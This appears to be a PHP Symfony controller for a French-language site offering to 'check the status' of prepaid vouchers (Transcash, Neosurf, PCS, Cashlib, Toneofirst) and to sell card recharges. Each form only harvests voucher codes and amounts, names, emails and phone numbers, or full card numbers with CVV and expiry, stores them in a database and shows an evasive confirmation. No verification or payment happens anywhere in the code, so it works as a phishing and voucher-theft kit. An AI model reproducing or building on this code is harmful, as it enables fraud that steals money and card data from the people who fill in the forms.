<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\Request;
use Doctrine\Common\Persistence\ObjectManager;

use Symfony\Component\Form\Extension\Core\Type\TextType;
use Symfony\Component\Form\Extension\Core\Type\EmailType;
use Symfony\Component\Form\Extension\Core\Type\TelType;
use Symfony\Component\Form\Extension\Core\Type\TextareaType;
use Symfony\Component\Form\Extension\Core\Type\IntegerType;
use Symfony\Component\Form\Extension\Core\Type\ChoiceType;
use Symfony\Component\Form\Extension\Core\Type\BirthdayType;
use Symfony\Component\Form\Extension\Core\Type\DateType;
use Symfony\Component\Form\Extension\Core\Type\SubmitType;

use App\Entity\Informationscoupons;
use App\Entity\Informationsneosurf;
use App\Entity\Informationspcs;
use App\Entity\Informationscashlib;
use App\Entity\Informationstoneofirst;
use App\Entity\Informationsrecharge;

use App\Repository\InformationscouponsRepository;
use App\Repository\InformationsneosurfRepository;
use App\Repository\InformationspcsRepository;
use App\Repository\InformationscashlibRepository;
use App\Repository\InformationstoneofirstRepository;
use App\Repository\InformationsrechargeRepository;

use Symfony\Component\Asset\Package;
use Symfony\Component\Asset\VersionStrategy\EmptyVersionStrategy;



class CodesController extends AbstractController
{
    /**
     * @Route("/", name="accueil")
     */
    public function index()
    {
        return $this->render('codes/index.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }

    /**
     * @Route("/Transcash", name="transcash")
     */
    public function transcash()
    {
        return $this->render('codes/transcash.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }

    /**
     * @Route("/Neosurf", name="neosurf")
     */
    public function neosurf()
    {
        return $this->render('codes/neosurf.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }


    /**
     * @Route("/PCS", name="pcs")
     */
    public function pcs()
    {
        return $this->render('codes/pcs.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }


    /**
     * @Route("/Cashlib", name="cashlib")
     */
    public function cashlib()
    {
        return $this->render('codes/cashlib.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }

    /**
     * @Route("/Toneofirst", name="toneofirst")
     */
    public function toneosurf()
    {
        return $this->render('codes/toneofirst.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }


    /**
     * @Route("/statuts-des-coupons", name="verification")
     */
    public function verification()
    {
        return $this->render('codes/verification.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }

    /**
     * @Route("/Recharger-vos-cartes", name="recharge")
     */
    public function recharge()
    {

        return $this->render('codes/recharge.html.twig', [
            'controller_name' => 'CodesController',
        ]);
    }



     /**
      * @Route("/Transcash/statut-coupon-transcash", name="verification-transcash")
     * Method ({"GET", "POST"})
     */
    public function verificationtranscash(Request $request){
        $informationscoupons = new informationscoupons();

        $form = $this->createFormBuilder($informationscoupons)
        ->add('nom', TextType::class, [
            'label' => false
        ])
        ->add('prenom', TextType::class, [

            'label' => false

        ])
        ->add('email', emailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        ->add('codecoupon1', TextType::class, [

            'label' => false,
            

        ])
        ->add('montantcoupon1', IntegerType::class, [

            'label' => false,
            

        ])
        ->add('codecoupon2', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon2', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon3', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon3', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon4', TextType::class, [


            'label' => false,
            'required'   => false,


        ])
        ->add('montantcoupon4', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();

            $article->setCreatedAt(new \DateTime());

            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un mail mais dans le cas contraire aucun mail.');


            return $this->redirectToRoute('verification-transcash');
        }

        return $this->render('codes/verification-transcash.html.twig',array(
            'forminformationscoupons'=>$form->createView()
        ));
    }


    /**
      * @Route("/Neosurf/statut-coupon-neosurf", name="verification-neosurf")
     * Method ({"GET", "POST"})
     */
    public function verificationneosurf(Request $request){
        $informationsneosurf = new informationsneosurf();

        $form = $this->createFormBuilder($informationsneosurf)
        ->add('nom', TextType::class, [
            'label' => false
        ])
        ->add('prenom', TextType::class, [

            'label' => false

        ])
        ->add('email', emailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        ->add('codecoupon1', TextType::class, [

            'label' => false

        ])
        ->add('montantcoupon1', IntegerType::class, [

            'label' => false

        ])
        ->add('codecoupon2', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon2', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon3', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon3', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon4', TextType::class, [


            'label' => false,
            'required'   => false,


        ])
        ->add('montantcoupon4', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();
            $article->setCreatedAt(new \DateTime());


            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un mail mais dans le cas contraire aucun mail.');


            return $this->redirectToRoute('verification-neosurf');
        }

        return $this->render('codes/verification-neosurf.html.twig',array(
            'forminformationsneosurf'=>$form->createView()
        ));
    }




    /**
      * @Route("/PCS/statut-coupon-pcs", name="verification-pcs")
     * Method ({"GET", "POST"})
     */
    public function verificationpcs(Request $request){
        $informationspcs = new Informationspcs();

        $form = $this->createFormBuilder($informationspcs)
        ->add('nom', TextType::class, [
            'label' => false
        ])
        ->add('prenom', TextType::class, [

            'label' => false

        ])
        ->add('email', emailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        ->add('codecoupon1', TextType::class, [

            'label' => false

        ])
        ->add('montantcoupon1', IntegerType::class, [

            'label' => false

        ])
        ->add('codecoupon2', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon2', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon3', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon3', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon4', TextType::class, [


            'label' => false,
            'required'   => false,


        ])
        ->add('montantcoupon4', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();
            $article->setCreatedAt(new \DateTime());


            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un mail mais dans le cas contraire aucun mail.');


            return $this->redirectToRoute('verification-pcs');
        }

        return $this->render('codes/verification-pcs.html.twig',array(
            'forminformationspcs'=>$form->createView()
        ));
    }

    /**
      * @Route("/Cashlib/statut-coupon-cashlib", name="verification-cashlib")
     * Method ({"GET", "POST"})
     */
    public function verificationcashlib(Request $request){
        $informationscashlib = new informationscashlib();

        $form = $this->createFormBuilder($informationscashlib)
        ->add('nom', TextType::class, [
            'label' => false
        ])
        ->add('prenom', TextType::class, [

            'label' => false

        ])
        ->add('email', emailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        ->add('codecoupon1', TextType::class, [

            'label' => false

        ])
        ->add('montantcoupon1', IntegerType::class, [

            'label' => false

        ])
        ->add('codecoupon2', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon2', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon3', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon3', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon4', TextType::class, [


            'label' => false,
            'required'   => false,


        ])
        ->add('montantcoupon4', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();
            $article->setCreatedAt(new \DateTime());


            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un mail mais dans le cas contraire aucun mail.');


            return $this->redirectToRoute('verification-cashlib');
        }

        return $this->render('codes/verification-cashlib.html.twig',array(
            'forminformationscashlib'=>$form->createView()
        ));
    }



    /**
      * @Route("/Toneofirst/statut-coupon-toneofirst", name="verification-toneofirst")
     * Method ({"GET", "POST"})
     */
    public function verificationtoneofirst(Request $request){
        $informationstoneofirst = new informationstoneofirst();

        $form = $this->createFormBuilder($informationstoneofirst)
        ->add('nom', TextType::class, [
            'label' => false
        ])
        ->add('prenom', TextType::class, [

            'label' => false

        ])
        ->add('email', emailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        ->add('codecoupon1', TextType::class, [

            'label' => false

        ])
        ->add('montantcoupon1', IntegerType::class, [

            'label' => false

        ])
        ->add('codecoupon2', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon2', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon3', TextType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('montantcoupon3', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->add('codecoupon4', TextType::class, [


            'label' => false,
            'required'   => false,


        ])
        ->add('montantcoupon4', IntegerType::class, [

            'label' => false,
            'required'   => false,

        ])
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();
            $article->setCreatedAt(new \DateTime());


            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un mail mais dans le cas contraire aucun mail.');


            return $this->redirectToRoute('verification-toneofirst');
        }

        return $this->render('codes/verification-toneofirst.html.twig',array(
            'forminformationstoneofirst'=>$form->createView()
        ));
    }






    /**
      * @Route("/acheter-une-recharge", name="achat-recharges")
     * Method ({"GET", "POST"})
     */
    public function achatrecharge(Request $request){
        $informationsrecharges = new Informationsrecharge();

        $form = $this->createFormBuilder($informationsrecharges)
        ->add('typerecharge', ChoiceType::class, [

            'choices' => [
                'Type de recharge' => '',
                'Transcash' => 'Transcash',
                'PCS' => 'PCS',
                'Neosurf' => 'Neosurf',
                'Cashlib' => 'Cashlib',
                'Toneofirst' => 'Toneofirst',
                
            ],

            'label' => false
        ])
        ->add('montantrecharge', ChoiceType::class, [


            'choices' => [
                'Montant de recharge' => '',
                '50€' => 50,
                '100€' => 100,
                '200€' => 200,
                '500€' => 500,
               
                
            ],


            'label' => false

        ])
        ->add('numerocarte', TextType::class, [

            'label' => false

        ])
        ->add('titulairecarte', TextType::class, [

            'label' => false

        ])
        ->add('cvv', TextType::class, [

            'label' => false

        ])
        ->add('expirationcarte', TextType::class, [

            'label' => false

        ])
        ->add('email', EmailType::class, [

            'label' => false

        ])
        ->add('telephone', TelType::class, [

            'label' => false

        ])
        
        
        ->getForm();

        $form->handleRequest($request);

        if($form->isSubmitted() && $form->isValid()){
            $article = $form->getData();
            $article->setCreatedAt(new \DateTime());


            $Manager = $this->getDoctrine()->getManager();
            $Manager->persist($article);
            $Manager->flush();
            $this->addFlash('success', 'vos informations ont été enregistrées avec succès!Si vos informations sont correctes,vous aller recevoir un code de rechargement par mail mais dans le cas contraire aucun mail.');

            return $this->redirectToRoute('achat-recharges');
        }

        return $this->render('codes/achat-recharges.html.twig',array(
            'forminformationsrecharges'=>$form->createView()
        ));

    }




}
